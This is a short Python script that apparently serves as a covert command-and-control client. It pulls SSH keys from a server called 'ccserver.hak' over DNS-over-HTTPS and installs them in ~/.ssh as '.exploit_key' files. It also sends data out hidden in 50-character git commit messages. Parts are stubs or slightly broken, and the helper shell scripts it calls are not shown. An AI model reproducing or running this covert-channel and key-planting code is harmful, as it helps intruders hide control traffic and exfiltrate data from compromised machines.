from os import listdir
import subprocess

SERVER="ccserver.hak"
PUB_KEY="id_rsa.pub"
PRV_KEY="id_rsa"

USER="ivlin"
REPO="commtest"
MAX_MSG_LEN = 50 #determined by the max commit length

def fetch_keys(server_name):
	subprocess.run(["bash","doh_get.sh","%s/%s"%(SERVER,PUB_KEY)])
	subprocess.run(["bash","doh_get.sh","%s/%s"%(SERVER,PRV_KEY)])

def init_git_keys():
	keynames = listdir("~/.ssh")
	index=1
	while (".exploit_key_%d"%index) in keynames or  (".exploit_key_%d.pub"%index) in keynames:
		index+=1
	subprocess.run(["bash","load_key.sh",(".exploit_key_%d"%index)])

def send_commit_message(msg):
	while len(msg) > 0:
		subprocess.run(["bash","transmit_msg.sh", USER, REPO, msg[:50]])
		msg=msg[50:]

def send_https_message(msg):
	subprocess.run(["curl","--doh-server","https://dns.google.com/dns-query","example.com"])

if __name__=="__main__":
	send_https_message("abc")	
	#send_commit_message("Test")